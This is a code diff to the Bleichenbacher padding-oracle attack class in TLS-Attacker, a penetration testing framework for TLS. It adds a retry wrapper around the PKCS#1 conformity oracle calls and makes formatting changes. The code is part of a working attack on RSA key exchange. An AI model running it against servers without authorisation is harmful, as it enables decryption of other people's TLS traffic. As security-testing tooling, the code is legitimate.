@@ -1,11 +1,10 @@
 /**
  * TLS-Attacker - A Modular Penetration Testing Framework for TLS
  *
- * Copyright 2014-2020 Ruhr University Bochum, Paderborn University,
- * and Hackmanit GmbH
+ * Copyright 2014-2021 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
  *
- * Licensed under Apache License 2.0
- * http://www.apache.org/licenses/LICENSE-2.0
+ * Licensed under Apache License, Version 2.0
+ * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
 
 package de.rub.nds.tlsattacker.attacks.pkcs1;
@@ -75,12 +74,11 @@ public class Bleichenbacher extends Pkcs1Attack {
         if (this.msgIsPKCS) {
             LOGGER.info("Step skipped --> " + "Message is considered as PKCS compliant.");
             LOGGER.info("Testing the validity of the original message");
-            oracle.checkPKCSConformity(encryptedMsg);
+            saveCheckPKCSConformity(encryptedMsg);
             s0 = BigInteger.ONE;
             c0 = new BigInteger(1, encryptedMsg);
-            interval =
-                new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
-                    (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
+            interval = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
+                (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
         } else {
             stepOne();
         }
@@ -118,22 +116,21 @@ public class Bleichenbacher extends Pkcs1Attack {
             send = prepareMsg(ciphered, si);
 
             // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
+            pkcsConform = saveCheckPKCSConformity(send);
         } while (!pkcsConform);
 
         c0 = new BigInteger(1, send);
         s0 = si;
         // mi = {[2B,3B-1]}
-        interval =
-            new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
-                (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
+        interval = new Interval[] { new Interval(BigInteger.valueOf(2).multiply(bigB),
+            (BigInteger.valueOf(3).multiply(bigB)).subtract(BigInteger.ONE)) };
 
         LOGGER.debug(" Found s0 : " + si);
     }
 
     /**
      *
-     * @param i
+     * @param  i
      * @throws OracleException
      */
     protected void stepTwo(final int i) throws OracleException {
@@ -156,7 +153,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      */
     protected void stepTwoA() throws OracleException {
         byte[] send;
-        boolean pkcsConform;
+        boolean pkcsConform = false;
         BigInteger n = publicKey.getModulus();
 
         LOGGER.debug("Step 2a: Starting the search");
@@ -176,13 +173,14 @@ public class Bleichenbacher extends Pkcs1Attack {
             send = prepareMsg(c0, si);
 
             // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
+            pkcsConform = saveCheckPKCSConformity(send);
+
         } while (!pkcsConform);
     }
 
     private void stepTwoB() throws OracleException {
         byte[] send;
-        boolean pkcsConform;
+        boolean pkcsConform = false;
         LOGGER.debug("Step 2b: Searching with more than" + " one interval left");
 
         do {
@@ -190,7 +188,7 @@ public class Bleichenbacher extends Pkcs1Attack {
             send = prepareMsg(c0, si);
 
             // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
+            pkcsConform = saveCheckPKCSConformity(send);
         } while (!pkcsConform);
     }
 
@@ -231,8 +229,24 @@ public class Bleichenbacher extends Pkcs1Attack {
             send = prepareMsg(c0, si);
 
             // check PKCS#1 conformity
-            pkcsConform = oracle.checkPKCSConformity(send);
+            pkcsConform = saveCheckPKCSConformity(send);
+
         } while (!pkcsConform);
+    }
+
+    private boolean saveCheckPKCSConformity(byte[] send) {
+        boolean pkcsConform = false;
+        boolean needToRedo = true;
+        while (needToRedo) {
+
+            try {
+                pkcsConform = oracle.checkPKCSConformity(send);
+                needToRedo = false;
+            } catch (Exception e) {
+                LOGGER.warn(e.toString());
+            }
+        }
+        return pkcsConform;
     }
 
     private void stepThree(final int i) {
@@ -327,9 +341,9 @@ public class Bleichenbacher extends Pkcs1Attack {
 
     /**
      *
-     * @param r
-     * @param modulus
-     * @param upperIntervalBound
+     * @param  r
+     * @param  modulus
+     * @param  upperIntervalBound
      * @return
      */
     protected BigInteger step2cComputeLowerBound(final BigInteger r, final BigInteger modulus,
@@ -343,9 +357,9 @@ public class Bleichenbacher extends Pkcs1Attack {
 
     /**
      *
-     * @param r
-     * @param modulus
-     * @param lowerIntervalBound
+     * @param  r
+     * @param  modulus
+     * @param  lowerIntervalBound
      * @return
      */
     protected BigInteger step2cComputeUpperBound(final BigInteger r, final BigInteger modulus,
